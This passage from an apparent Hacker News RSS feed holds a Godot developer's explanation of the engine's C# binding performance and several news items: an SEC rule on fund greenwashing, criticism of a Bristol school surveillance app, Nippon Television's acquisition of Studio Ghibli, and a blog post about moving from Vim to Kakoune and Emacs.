</ul>
<p dir="auto">Of course, if you are absolutely unfamliar to Godot, the first questions that come to mind are:</p>
<ul dir="auto">
<li>How do you expose more complex datatypes?</li>
<li>What about other datatypes such as int16?</li>
</ul>
<p dir="auto">In general, you can expose more complex datatypes via Object API, so this is not much of an issue. Additionally, modern processors all have at minimum 64 bit buses, so exposing anything other than 64 bit scalar types makes no sense.</p>
<p dir="auto">If you are unfamliar to Godot, I can totally understand the disbelief. But in truth, it works fine and it makes everything
far simpler at the time of developing the engine. This data model is one of the main reasons why Godot is such a tiny,
efficient and yet feature packed engine compared to the large mainstream mamooths. As you get more familiar with the source
code, you will start to see why.</p>
<h3 id="user-content-language-binding-system" dir="auto"><a href="#language-binding-system">Language Binding System</a></h3>
<p dir="auto">Now that we have our data model, Godot imposes a strict requirement that almost any function exposed to the engine API
must be done via those datatypes. Any function parameters, return types or properties exposed must be via them too.</p>
<p dir="auto">This makes the job of the binder much simpler. As such, Godot has what we call an universal binder. How does this binder work, then?</p>
<p dir="auto">Godot registers any C++ function to the binder like this:</p>
<div dir="auto"><pre>Vector3 <span>MyClass::my_function</span>(<span>const</span> Vector3&amp; p_argname) {
   <span><span>//</span>..//</span>
}

<span><span>//</span> Then, on a special function, Godot does:</span>

<span><span>//</span> Describe the method as having a name and the name of the argument, the pass the method pointer</span>
<span>ClassDB::bind_method</span>(D_METHOD(<span><span>"</span>my_function<span>"</span></span>,<span><span>"</span>my_argname<span>"</span></span>), &amp;MyClass::my_function);</pre></div>
<p dir="auto">Internally, <em>my_function</em> and <em>my_argument</em> are converted to a StringName (described above), so from now onwards they are
treated just as a unique pointer by the binding API. In fact, when compiling on release, the argument name is ignored by
the template and no code is generated, since it serves no purpose.</p>
<p dir="auto">So, what does <code>ClassDB::bind_method</code> do? If you want to dive into the depths of insanity and try to understand the
incredibly complex and optimized C++17 variadic templates black magic, feel free <a href="https://github.com/godotengine/godot/blob/master/core/object/method_bind.h">to go ahead</a>.</p>
<p dir="auto">But In short, it creates a static function like this, which Godot calls "ptrcall" form.:</p>
<div dir="auto"><pre><span><span>//</span> Not really done like this, but simplifying as much as possible so you get an idea:</span>

<span>static</span> <span>void</span> <span>my_function_ptrcall</span>(<span>void</span> *instance, <span>void</span> **arguments, <span>void</span> *ret_value) {
    MyClass *c = (MyClass*)instance;
    Vector3 *ret = (Vector3*)ret_value;
    *ret = c-&gt;<span>my_method</span>( *(Vector3*)arguments[<span>0</span>] );
}</pre></div>
<p dir="auto">This wrapper is basically as efficient as it can be. In fact, for critical functions, inline is forced into the class method, resulting in a C function pointer to the actual function code.</p>
<p dir="auto">Then Language API works by allowing the request of any engine function in "ptrcall" format. To call this format,
the language must:</p>
<ul dir="auto">
<li>Allocate a bit of stack (basically just adjusting the stack pointer of the CPU)</li>
<li>set a pointer to the arguments (which already exist in native form in this language 1:1, be it GodotCPP, C#, Rust, etc).</li>
<li>call.</li>
</ul>
<p dir="auto">And that's it. This is an incredibly efficient generic glue API that you can use to expose any language to Godot efficiently.</p>
<p dir="auto">So, as you can imagine, the C# API in Godot basically uses a C function pointer via unsafe API to call after assigning pointers
to native C# types. It is very, very efficient.</p>
<h3 id="user-content-godot-is-not-the-new-unity---the-anatomy-of-a-godot-api-call" dir="auto"><a href="#godot-is-not-the-new-unity---the-anatomy-of-a-godot-api-call">Godot is not the new Unity - The anatomy of a Godot API call</a></h3>
<p dir="auto">I want to insist that the article written by Sam Pruden is fantastic, but if you are not familiar with how Godot is intended to work under the hood it can be very misleading. I will proceed to explain a bit more in detail what is easy to misunderstand.</p>
<h4 id="user-content-only-a-pathological-use-case-is-shown-the-rest-of-the-api-is-fine" dir="auto"><a href="#only-a-pathological-use-case-is-shown-the-rest-of-the-api-is-fine">Only a pathological use case is shown, the rest of the API is fine.</a></h4>
<p dir="auto">The use case shown in the article, the ray_cast function, is a pathological one in the Godot API.
Cases like this are most likely less 0.01% of the API exposed by Godot. Why the author found this specific one,
I have no idea nor I will speculate, but I think it was just an unfortunate coincidence.</p>
<p dir="auto">The problem is that, at the C++ level, this function takes a struct pointer for performance. But at the language
binding API this is difficult to expose properly. This is very old code (dating to the opensourcing of Godot) and
a Dictionary was hacked-in to use temporarily until something better is found. Of course, other stuff was more prioritary and very few games need thousands of raycasts, so pretty much nobody complained. Still, there is a <a href="https://github.com/godotengine/godot-proposals/issues/7329" data-hovercard-type="issue" data-hovercard-url="/godotengine/godot-proposals/issues/7329/hovercard">recently open proposal</a> to discuss more efficient binding of these types of functions.</p>
<p dir="auto">Additionally, to add to how unfortunate this choice of function is, the Godot language binding system <em>does</em> support
struct pointers like this. GodotCPP and Rust bindings can use pointers to structs without any issue. The problem
is that C# support in Godot predates the extension system and it was not converted to it yet. Eventually, C# will be
moved to the universal extension system and this will allow the unifying of the default and .net editors, it is just
not the case yet, but its top in the list of priorities.</p>
<h4 id="user-content-the-workaround-is-even-more-pathological" dir="auto"><a href="#the-workaround-is-even-more-pathological">The workaround is even more pathological</a></h4>
<p dir="auto">Although this time, due to a limitation of C#. If you bind C++ to C#, you need to create a C# version of a C++ instance
as an adapter. This is not an unique problem to Godot, any other engine or application doing this will require the same.</p>
<p dir="auto">Why is it troublesome? because C# has a garbage collector and C++ does not. This forces the C++ instance to keep a link
to the C# instance to avoid it from being collected.</p>
<p dir="auto">Due to this, the C# binder must do extra work when calling Godot functions that take class instances. You can see
this code in Sam's article:</p>
<div dir="auto"><pre><span>public</span> <span><span>static</span></span> GodotObject <span>UnmanagedGetManaged</span><span>(</span><span>IntPtr</span> <span>unmanaged</span><span>)</span>
<span>{</span>
    <span>if</span> <span>(</span><span>unmanaged</span> <span>==</span> IntPtr<span>.</span>Zero<span>)</span> <span>return</span> <span>null</span><span>;</span>

    <span>IntPtr</span> <span>intPtr</span> <span>=</span> NativeFuncs<span>.</span><span>godotsharp_internal_unmanaged_get_script_instance_managed</span><span>(</span>unmanaged<span>,</span> <span>out</span> <span>var</span> r_has_cs_script_instance<span>)</span><span>;</span>
    <span>if</span> <span>(</span><span>intPtr</span> <span>!=</span> IntPtr<span>.</span>Zero<span>)</span> <span>return</span> <span>(</span>GodotObject<span>)</span>GCHandle<span>.</span><span>FromIntPtr</span><span>(</span>intPtr<span>)</span><span>.</span>Target<span>;</span>
    <span>if</span> <span>(</span>r_has_cs_script_instance<span>.</span><span>ToBool</span><span>(</span><span>)</span><span>)</span> <span>return</span> <span>null</span><span>;</span>

    <span>intPtr</span> <span>=</span> NativeFuncs<span>.</span><span>godotsharp_internal_unmanaged_get_instance_binding_managed</span><span>(</span>unmanaged<span>)</span><span>;</span>
    <span>object</span> <span>obj</span> <span>=</span> <span>(</span><span>(</span><span>intPtr</span> <span>!=</span> IntPtr<span>.</span>Zero<span>)</span> <span>?</span> GCHandle<span>.</span><span>FromIntPtr</span><span>(</span>intPtr<span>)</span><span>.</span>Target <span>:</span> <span>null</span><span>)</span><span>;</span>
    <span>if</span> <span>(</span><span>obj</span> <span>!=</span> <span>null</span><span>)</span> <span>return</span> <span>(</span><span>GodotObject</span><span>)</span><span>obj</span><span>;</span>

    <span>intPtr</span> <span>=</span> NativeFuncs<span>.</span><span>godotsharp_internal_unmanaged_instance_binding_create_managed</span><span>(</span>unmanaged<span>,</span> intPtr<span>)</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>(</span><span>intPtr</span> <span>!=</span> IntPtr<span>.</span>Zero<span>)</span><span>)</span> <span>return</span> <span>null</span><span>;</span>

    <span>return</span> <span>(</span>GodotObject<span>)</span>GCHandle<span>.</span><span>FromIntPtr</span><span>(</span>intPtr<span>)</span><span>.</span>Target<span>;</span>
<span>}</span></pre></div>
<p dir="auto">While very efficient, it's still not ideal for hot paths so the Godot API exposed is considerate and does not expose anything critical this way. The workaround used, however, is quite complex and hits this path due to not using the actual function
intended for it.</p>
<h4 id="user-content-the-question-of-cherry-picking" dir="auto"><a href="#the-question-of-cherry-picking">The question of cherry picking</a></h4>
<p dir="auto">I firmly believe the author did not cherry pick this API on purpose. In fact, he himself writes that he checked other places of
API usages and did not find anything with this level of pathology either.</p>
<p dir="auto">However, he mentions:</p>
<pre><code>Let’s also remember that Dictionary is only part of the problem. If we look a little wider for things returning 
Godot.Collections.Array&lt;T&gt; (remember: heap allocated, contents as Variant) we find lots from physics, 
mesh &amp; geometry manipulation, navigation, tilemaps, rendering, and more.
</code></pre>
<p dir="auto">From my side and contributors side, none of those usages are hot paths or pathological. Remember that, as I mentioned above,
Godot uses the Godot types mainly for serialization and API communication. While it is true that they do heap allocation,
this only happens once when the data is created.</p>
<p dir="auto">I think what may have confused Sam and a few others in this area (which is normal if you are not familiar with the Godot codebase) is that Godot containers don't work like STL containers. Because they are used mainly to pass data around, they are
allocated once and then kept via reference counting.</p>
<p dir="auto">This means, the function that reads your mesh data from disk is the only one doing the allocation, then this pointer gets
passed through many layers via reference counting until arrives Vulkan and is uploaded to the GPU. Zero copies happen along
the way.</p>
<p dir="auto">Likewise, when these containers are exposed to C# via the Godot collections, they are also reference counted internally.
If you create one of those arrays to pass the the Godot API, the allocation only happens <em>once</em>. Then no further copies happen
and the data arrives intact to the consumer.</p>
<p dir="auto">Of course, intenally, Godot uses far more optimized containers that are not directly exposed to the binder API.</p>
<h4 id="user-content-misleading-conclusion" dir="auto"><a href="#misleading-conclusion">Misleading conclusion</a></h4>
<p dir="auto">The article concludes like this:</p>
<pre><code>Godot has made a philosophical decision to be slow. The only practical way to interact with the engine is via this binding layer, and its core design prevents it from ever being fast. No amount of optimising the implementation of Dictionary or speeding up the physics engine is going to get around the fact we’re passing large heap allocated values around when we should be dealing with tiny structs. While C# and GDScript APIs remain synchronised, this will always hold the engine back.
</code></pre>
<p dir="auto">As you have read in the above points, the binding layer is absolutely not slow. What can be slow is an extremely limited amount of use cases that can be pathological. For those cases, a dedicated solution is found. This is a general <a href="https://docs.godotengine.org/en/stable/contributing/development/best_practices_for_engine_contributors.html#to-each-problem-its-own-solution" rel="nofollow">philosophy</a> behind Godot development that helps keep the codebase small, tidy, maintainable and easy to understand.</p>
<p dir="auto">In other words, this principle:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://user-images.githubusercontent.com/6265307/269689859-d3bb5bec-1473-4803-a7d4-9ebc33736d48.png"><img src="https://user-images.githubusercontent.com/6265307/269689859-d3bb5bec-1473-4803-a7d4-9ebc33736d48.png" alt="image"></a></p>
<p dir="auto">The current binder serves its purpose and works well and efficiently for over 99.99% of use cases. For the exceptional ones, as mentioned before, the extension API supports structs already (which you can see here in this excerpt of the extension api dump):</p>
<pre><code>		{
			"name": "PhysicsServer2DExtensionRayResult",
			"format": "Vector2 position;Vector2 normal;RID rid;ObjectID collider_id;Object *collider;int shape"
		},
		{
			"name": "PhysicsServer2DExtensionShapeRestInfo",
			"format": "Vector2 point;Vector2 normal;RID rid;ObjectID collider_id;int shape;Vector2 linear_velocity"
		},
		{
			"name": "PhysicsServer2DExtensionShapeResult",
			"format": "RID rid;ObjectID collider_id;Object *collider;int shape"
		},
		{
			"name": "PhysicsServer3DExtensionMotionCollision",
			"format": "Vector3 position;Vector3 normal;Vector3 collider_velocity;Vector3 collider_angular_velocity;real_t depth;int local_shape;ObjectID collider_id;RID collider;int collider_shape"
		},
		{
			"name": "PhysicsServer3DExtensionMotionResult",
			"format": "Vector3 travel;Vector3 remainder;real_t collision_depth;real_t collision_safe_fraction;real_t collision_unsafe_fraction;PhysicsServer3DExtensionMotionCollision collisions[32];int collision_count"
		},
</code></pre>
<p dir="auto">So, ultimately, I believe that the conclusion that "Godot is slow by design" is a bit rushed. What is currently missing is the move of the C# language to the GDExtension system in order to be able to take advantage of these. This is currently a work in progress.</p>
<h3 id="user-content-to-sum-up" dir="auto"><a href="#to-sum-up">To sum up</a></h3>
<p dir="auto">I hope that this short article is used to dispell a few misconceptions that unintentionally arised from Sam's excellent article:</p>
<ul dir="auto">
<li><strong>Godot C# API is inefficient:</strong> This is absolutely not the case, but very few pathological cases remain to be solved and were already being in discussion before last week. In practice, very very few games may run into them and, by next year, hopefully none.</li>
<li><strong>Godot API is designed around GDScript:</strong> This is also not true. In fact, until Godot 4.1, typed GDScript did calls via "ptrcall" syntax, and the argument encoding was a bottleneck. As a result, we created a <a href="https://github.com/godotengine/godot/pull/79893" data-hovercard-type="pull_request" data-hovercard-url="/godotengine/godot/pull/79893/hovercard">special path</a> for GDScript to call more efficiently.</li>
</ul>
<p dir="auto">Thanks for reading and remember that Godot is not commercial software developed behind closed doors. All of us who make it are available online in the same communities as you. If you have any doubt, feel free to ask us directly.</p>
<p dir="auto"><strong>Bonus:</strong> As a side note, and contrary to popular belief, the Godot data model was not created for GDScript. Originaly, the engine used other languages such as Lua or Squirrel, with several published games while an in-house engine. GDScript was developed afterwards.</p>
</article>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The SEC cracks down on greenwashing (135 pts)]]></title>
            <link>https://www.semafor.com/article/09/21/2023/the-sec-cracks-down-on-greenwashing</link>
            <guid>37598329</guid>
            <pubDate>Thu, 21 Sep 2023 14:40:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.semafor.com/article/09/21/2023/the-sec-cracks-down-on-greenwashing">https://www.semafor.com/article/09/21/2023/the-sec-cracks-down-on-greenwashing</a>, See on <a href="https://news.ycombinator.com/item?id=37598329">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p><img width="30" height="30" src="https://img.semafor.com/eb687b94b93248efbff9e65b02568febf0405a45-2000x2127.png" alt="Jeronimo Gonzalez"><span>/</span></p><p><span>The U.S. Securities and Exchange Commission, the country’s top financial regulator, adopted a new rule to crack down on investment fund “greenwashing.”</span> Funds will be required to ensure that 80% of their portfolio match the asset advertised by the fund’s name. Since 2021, the SEC has prosecuted funds that bill themselves as investing exclusively in securities that rank highly in environmental, social, and governance measurements but which rather cast a much wider net with their investments. “<a href="https://www.ft.com/content/c626c311-7699-43b1-a98d-9740e06efc85" rel="no-referrer">It is truth in advertising,</a>” Gary Gensler, the SEC chair, said.</p></div><div><div><p><strong>The move was largely welcomed by activists and environmentalists, including some who had long considered the lax restrictions deceptive or even predatory of retail investors. </strong>“These rules will help cut down on greenwashing and misleading marketing so that millions of U.S. investors ensure … their money is being invested in line with their interests and their values,” a strategist at the Sierra Club, an environmental advocacy organization, said. “The SEC’s action today is a vital step,” the Environmental Defense Fund wrote.</p></div><div><figure><img width="800" height="607" src="https://img.semafor.com/aefe84b7e5a2af5f8ac552065f61a3c91ac02a03-1106x840.png?w=1600&amp;q=75&amp;auto=format" alt="" loading="lazy"></figure><p><strong>Despite a market downturn in 2022</strong> — during which traditional funds suffered billions of dollars in outflows — investors continued to flock to ESG funds, pushing their assets under management to a record $2.8 trillion last year. Demand has been driven largely by Europe<span>• <!-- -->1<!-- --> </span>, which accounted for 89% of sustainable funds’ assets. After years of out-performing traditional funds, however, sustainable funds’ returns fell below those of traditional ones last year, according to Morgan Stanley research.</p></div><div><p><strong>The EU is also cracking down on greenwashing.</strong> From 2026, products that can’t back up the accuracy of products marketed as being “climate neutral,” “eco,” or other sweeping environmental claims will be banned. The new rule, which climate NGOs have long agitated for, will make the EU the toughest region in the world in terms of green claims made to the public, the Financial Times reported. “Carbon neutral claims are greenwashing <span>• <!-- -->2<!-- --> </span>,” the head of a European consumer association said. “The truth is that these claims are scientifically incorrect and should never be used.”</p></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Call to shut down Bristol schools’ use of app to ‘monitor’ pupils and families (147 pts)]]></title>
            <link>https://www.theguardian.com/education/2023/sep/21/calls-to-shut-down-bristol-schools-use-of-think-family-education-app-pupils-and-families</link>
            <guid>37597165</guid>
            <pubDate>Thu, 21 Sep 2023 13:16:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theguardian.com/education/2023/sep/21/calls-to-shut-down-bristol-schools-use-of-think-family-education-app-pupils-and-families">https://www.theguardian.com/education/2023/sep/21/calls-to-shut-down-bristol-schools-use-of-think-family-education-app-pupils-and-families</a>, See on <a href="https://news.ycombinator.com/item?id=37597165">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="maincontent"><p>Criminal justice and antiracist campaigners have raised concerns over an app being used by schools in <a href="https://www.theguardian.com/uk/bristol" data-link-name="in body link" data-component="auto-linked-tag">Bristol</a> to “monitor and profile” pupils and their families.</p><p>The app, which is being used by more than 100 schools, gives safeguarding leads quick, easy access to pupils’ and their families’ contacts with police, child protection and welfare services.</p><p>One of the concerns campaigners have is that the Think Family Education (TFE) app includes analysing which children could be at risk of exposure to criminality, which they argue risks leading to more discrimination against pupils from minority ethnic or working-class backgrounds.</p><p>Staff using the app have told <a href="https://www.fairtrials.org/" data-link-name="in body link">the criminal justice campaign charity Fair Trials</a> that they keep it secret from parents and carers, and admitted many would be concerned about it if they knew of it.</p><p>Bristol city council and Avon and Somerset police, who worked together on the system, insist it is in place to protect children, not criminalise them, and deny it is secret, pointing out that <a href="https://www.bristol.gov.uk/residents/social-care-and-health/children-and-families/insight-bristol" data-link-name="in body link">information about its existence is publicly available</a>.</p><p>But Fair Trials said the vast majority of parents would know nothing about the app. Griff Ferris, the charity’s senior legal and policy officer, said: “Schoolchildren should not be monitored, profiled and criminalised by secretive police databases. Surveillance is not safeguarding.</p><p>“Systems like this uphold existing discrimination against children and families from minoritised ethnic and more deprived backgrounds. This system is expanding the net of surveillance. It should be shut down.”</p><p>A spokesperson for <a href="https://www.nomoreexclusions.com/" data-link-name="in body link">the antiracist organisation No More Exclusions Bristol</a> said: “Technologies that gather and use information in the name of ‘public safety’ overwhelmingly reproduce racialised ideas of problematic behaviour.”</p><p>Liz Fekete, the director of the Institute of Race Relations, strongly criticised elements of the app, saying the approach “stigmatises whole families and leaves even primary school children vulnerable to police surveillance and intelligence gathering”.</p><p>When it was consulted, the Bristol City Youth Council, an elected group of young people, expressed reservations that if the system was not used properly it could lead to “prejudice and judgment”.</p><p>Systems to collate information about children are used in other parts of England but Bristol city council describes Think Family as “innovative” and a number of local authorities are watching how the app works.</p><p>On its website, the council says the <a href="https://www.bristol.gov.uk/residents/social-care-and-health/children-and-families/insight-bristol" data-link-name="in body link">Think Family database</a>, which the app draws on, includes information from about 50,000 families across the city collected from agencies including social care, police and the Department for Work and Pensions. It says it highlights “vulnerabilities or needs” and uses “targeted analytics” to help identify children at risk of sexual or criminal exploitation.</p><p>Critics say the reality is that this risks children from minority ethnic or poorer backgrounds being profiled as being involved in gangs or county lines operations.</p><p>Schools using the TFE app receive alerts about children’s and family members’ contact with police, antisocial behaviour and domestic violence incidents. The system also gives schools access to sensitive personal details about families’ financial situations.</p><p>School safeguarding leads told Fair Trials that they kept the system secret from children and their families. One said: “They [parents and carers] wouldn’t know about this ... parents will have no kind of sight of it at all ... They just don’t know of its existence.”</p><p>They described the system as “an early warning process” and admitted: “I think there’s a bit of a risk it getting out there that schools hold this kind of central bank of information.”</p><p>A spokesperson for Bristol city council said the Think Family database was introduced to counter the trend of agencies working in silos at a time of a “generational squeeze” on public finances.</p><p>The spokesperson said: “The introduction of the Think Family Education app means that schools … have access to appropriate information in a secure and restricted way to make decisions about how they support children. There are strict controls in place about who can access this information, how they do this and the reasons why.”</p><p>A spokesperson for Avon and Somerset police said the database gave professionals working with children joined-up information to identify and safeguard those at risk of criminal and sexual exploitation.</p><p>“The TFE app gives professionals immediate access to this information, helping them to act swiftly on any identified risks.” The spokesperson said neither the app or database assessed the likelihood of an individual to commit a crime.</p><p>The force said “robust privacy and sharing agreements” had been approved by <a href="https://ico.org.uk/" data-link-name="in body link">the Information Commissioner’s Office</a> and development of the system done in collaboration with the <a href="https://www.gov.uk/government/organisations/centre-for-data-ethics-and-innovation" data-link-name="in body link">Centre for Data Ethics and Innovation</a>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Nippon Television has just acquired Studio Ghibli (469 pts)]]></title>
            <link>https://www.catsuka.com/breves/2023-09-21/nippon-television-rachete-le-studio-ghibli</link>
            <guid>37596788</guid>
            <pubDate>Thu, 21 Sep 2023 12:44:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.catsuka.com/breves/2023-09-21/nippon-television-rachete-le-studio-ghibli">https://www.catsuka.com/breves/2023-09-21/nippon-television-rachete-le-studio-ghibli</a>, See on <a href="https://news.ycombinator.com/item?id=37596788">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><strong>Nippon Television</strong> vient de racheter le <strong>Studio Ghibli</strong>, qui deviendra une filiale de leur soci�t�.</p><p>

Le producteur Toshio Suzuki (75 ans) cherchait un successeur, il a propos� Goro Miyazaki, mais Hayao Miyazaki (82 ans) a refus� (et Goro Miyazaki aussi).</p><p>

Nippon Television, qui d�tiendra d�sormais 42,3% des droits de vote, �tait d�j� un partenaire de longue date de Ghibli, notamment � travers la case TV "Friday Road Show", qui diffuse les films du studio sur la cha�ne depuis Nausicaa.</p><a href="https://pbs.twimg.com/media/F6iDsiSWsAAPJZY?format=jpg&amp;name=large" target="_blank"><center><img src="https://pbs.twimg.com/media/F6iDsiSWsAAPJZY?format=jpg&amp;name=small"></center></a><p>

From <a href="https://twitter.com/catsuka/status/1704757264324665345" target="_blank">Catsuka on Twitter</a> :</p><center>

<blockquote><p lang="en" dir="ltr">Nippon Television has just acquired Studio Ghibli.<br>Producer Toshio Suzuki (75) was looking for a successor, and proposed Goro Miyazaki, but Hayao Miyazaki (85) refused (and so did Goro).<br>And Nippon Television was an old Ghibli's partner (Friday Road Show).<a href="https://t.co/EX4jsKXrkP">https://t.co/EX4jsKXrkP</a> <a href="https://t.co/n0TkyTxeZS">pic.twitter.com/n0TkyTxeZS</a></p>� Catsuka 💙 (@catsuka) <a href="https://twitter.com/catsuka/status/1704757264324665345?ref_src=twsrc%5Etfw">September 21, 2023</a></blockquote>

</center><p>

Source : <a href="https://www.oricon.co.jp/news/2295679/full/" target="_blank">Oricon</a></p><div><p><img src="https://www.catsuka.com/interf/images/english_flag.gif"> <b>English audience</b> :</p><p>Nippon Television has just acquired Studio Ghibli, which will become a subsidiary of their company.<br>
Producer Toshio Suzuki (75y old) was looking for a successor, and proposed Goro Miyazaki, but Hayao Miyazaki (82y old) refused (and so did Goro).<br>
Nippon Television was already a long-standing partner of Ghibli ("Friday Road Show").</p><p>(2023/09/21)</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why Kakoune (108 pts)]]></title>
            <link>https://andreyor.st/posts/2023-09-20-why-kakoune/</link>
            <guid>37596776</guid>
            <pubDate>Thu, 21 Sep 2023 12:42:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://andreyor.st/posts/2023-09-20-why-kakoune/">https://andreyor.st/posts/2023-09-20-why-kakoune/</a>, See on <a href="https://news.ycombinator.com/item?id=37596776">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
    <p>Recently I’ve stumbled upon a video about Kakoune, a code editor: <a href="https://www.youtube.com/watch?v=5WLlLxU2EZE" target="_blank">Idiot user tries to use Kakoune (for notes? Also Helix?)</a>.
Funnily enough, I was <a href="https://www.youtube.com/watch?v=5WLlLxU2EZE&amp;t=1004s" target="_blank">mentioned</a> in this video, which was a surprise, and made me laugh for quite a while:</p>
<blockquote>
<p>Let’s go back to the official plugins page.
This guy has made a bunch of plugins.
<strong>Who is he?</strong>
<em>How is he able to make such good use of Kakoune?</em>
<strong>Oh, he’s an Emacs user!</strong>
<strong>Of course!</strong></p>
</blockquote>
<p>Yeah, I am.</p>
<p>Even though the video <strong>is</strong> about Kakoune, the author’s main focus is note-taking and the oddities that come with this process when using a <em>code editor</em> to edit <em>text</em>.
Kakoune advertises itself as a code editor for the most part, and I have to agree.
As far as I know, Maxime Coste (<a href="https://github.com/mawww" target="_blank">@mawww</a>), the creator of Kakoune, made it because of the desire for a better programming experience.
As a result, a small and contained code editor was made.
And I can appreciate a desire of the system one can fully grasp and understand.</p>
<p>Kakoune is relatively small, compared to Emacs and Vim that is.
It doesn’t feature a scripting language, instead relying on shelling out if you need any programmable features.
It’s a clever trick, and the editor exposes its internal state as a set of shell variables, so you still can do interactive things based on your workflow.
And I did a lot of this back in the day when I used Kakoune.</p>
<p>I have mentioned Kakoune in this blog previously, but it was rather sparse.
The reason for that is stated in the video pretty accurately - I use Emacs and not Kakoune, so there’s little to no reason for me to write about it besides occasional praise or comparisons.
I mention it on my about page, and in various text-editor-related posts, but that’s it.
I don’t participate in the Kakoune community anymore, and no longer actively maintain my packages, as I no longer use Kakoune.</p>
<p>But I still need to address <a href="https://youtu.be/5WLlLxU2EZE?t=1017" target="_blank">this</a> point of the video - I wasn’t an Emacs user when I started with Kakoune.
Before Kakoune I was a Vim user!
And transition from Vim to Kakoune was caused by several factors, one of which is again stated in the video:</p>
<blockquote>
<p>…and people have written so many damn Vim plugins over the years that if you have a need it’s already been addressed like three or four different ways.
So with Vim you could just piece together your ideal text editor like LEGO bricks…</p>
</blockquote>
<p>And that’s exactly my problem with Vim - too many ways to do the same thing.
At the time, I was working with SoC in C and started using the <a href="https://github.com/dense-analysis/ale" target="_blank">Ale</a> plugin for asynchronous linting of the project, as the synchronous linting was quite slow.
This was before LSP inception - just look at <a href="https://github.com/dense-analysis/ale/blob/master/supported-tools.md" target="_blank">how many tools Ale supports</a>.
As far as I remember LSP was added to Ale much later, when competing plugins showed up.</p>
<p>Competing plugins.</p>
<p>There’s nothing bad with competition on its own, and in Emacs, this is also present, with many plugins, but in Vim’s case, I feel that people created most of the plugins purely because of the NIH<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> syndrome.
I lost count of how many plugins provided autocomplete interfaces, there were tons of list-narrowing frameworks, plugin managers, and snippet managers, and everything was poorly integrated with each other.
I remember that some autocomplete plugins did not integrate well or at all with snippets, some synchronous completion providers were not supported by asynchronous completion frameworks, and so on.
Again, this was before LSP came to the scene and basically became a standard for these features.
So perhaps the situation is a bit better today, but I still have doubts.
NeoVim people are going crazy over Lua API, writing their configs in Fennel, and making new Lua-based plugins that may or may not be compatible with the rest of the ecosystem.</p>
<p>Fact is, you <em>can</em> piece your dream text editor like <em>LEGO</em> bricks, just beware that some of these bricks are actually <a href="https://en.wikipedia.org/wiki/Lego_Duplo" target="_blank">Duplo</a> blocks, some are <a href="https://en.wikipedia.org/wiki/Cobi_%28building_blocks%29" target="_blank">COBI</a> bricks, lots and lots are probably <a href="https://brickscompare.com/brands/8-lele" target="_blank">LELE</a>, and some are even freakin’ <em><a href="https://andreyor.st/2023-09-20-why-kakoune/oleg.jpg">OLEG</a></em>.
Well, at least that was the situation when I used Vim, I gave up on updating my config around 2018 and made the switch to Kakoune.
By that time I already made three plugins for Vim because I was unsatisfied with existing ones, but they were crappy too.
Integrating these plugins into different other plugins was a huge pain.
So I <a href="https://github.com/andreyorst/dotfiles/commit/d91e8ca4ccb59c89c2043d5d2c4eb8af3fbe498d" target="_blank">made the switch</a>.
You can trace the history from that point if you’re interested in my Kakoune journey (why would you be though).</p>
<p>Obviously, I missed a lot of features from Vim, and Kakoune actually has an entry on their wiki on how to migrate from Vim.
Unfortunately, though, the suggestions were either too hardcore-minimalist or uncooperative.
For example, Vim’s <code>smarttab</code> feature didn’t exist, and <code>expandtab</code> was <a href="https://github.com/mawww/kakoune/wiki/Indentation-and-Tabulation/e6756dc1a8af07add53145a9251eeb2ba0e0c5a5" target="_blank">suggested</a> to be done via hooks.
Not that it was wrong, but it was suggested when people asked about a very specific feature of Vim, and these did not provide the same feature as in Vim.
So I started writing plugins.</p>
<p>However, Kakoune didn’t have conventional plugins at all at that time.
Well, there was a section with plugins on the official page, but there was no real ecosystem.
There was nothing such as Vimplug if you will.</p>
<p>Installing plugins meant you had to manually copy files around, or load them pathogen-style, but the process wasn’t convenient or easy to automate in my opinion.
Updating plugins installed in this way was problematic too.
This motivated me to make <a href="https://github.com/andreyorst/plug.kak" target="_blank">plug.kak</a>.
And then I started experimenting more and more with other interesting plugins.</p>
<p>But, around the same time I switched to Kakoune, I briefly tried Emacs.
In reality, I tried Emacs like 4 times at that point, the earliest one dates back to around 2010.
All four times I did not succeed, but something gravitated me to it for some reason.
This last one actually was a reason why I made some plugins like <a href="https://github.com/andreyorst/langmap.kak" target="_blank">langmap.kak</a> or <a href="https://github.com/andreyorst/kaktree" target="_blank">kaktree</a>, which resemble what I saw in Emacs at that point.
Many plugins were inspired by Vim, like <a href="https://github.com/andreyorst/smarttab.kak" target="_blank">smarttab.kak</a>, <a href="https://github.com/andreyorst/powerline.kak" target="_blank">powerline.kak</a>, <a href="https://github.com/andreyorst/fzf.kak" target="_blank">fzf.kak</a>, <a href="https://github.com/andreyorst/tagbar.kak" target="_blank">tagbar.kak</a>, equivalents to which I daily used in Vim before.
And at that time, Kakoune really did everything I needed and was a very capable code editor.</p>
<p>But I still wanted something more.
So why I made the switch to Emacs - but for a bit different reasons.</p>
<p>First of all, I started enjoying writing more prose instead of just writing code.
And if you’ve watched the video I linked above, the author similarly wants a text editor, not a code editor.
There’s <a href="https://www.youtube.com/watch?v=XRpHIa-2XCE" target="_blank">another video</a> on their channel about note-taking, featuring a lot of programs made specifically for this task, and it features a text editor section at the end in which the author talks about Emacs and Vim, briefly touching Kakoune and Helix.
What they’re saying about Emacs is also very similar to what I’ve experienced, although I didn’t use an Emacs distribution, I started with vanilla<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</p>
<p><strong>Org Mode.</strong></p>
<p>I don’t know how to explain this to a non-Emacs, non-Org person, but every time someone asks the “Why Emacs?” question, Org Mode is somewhere at the top of the answers.
And I never understood that, until I tried for myself.
And boy are they right.
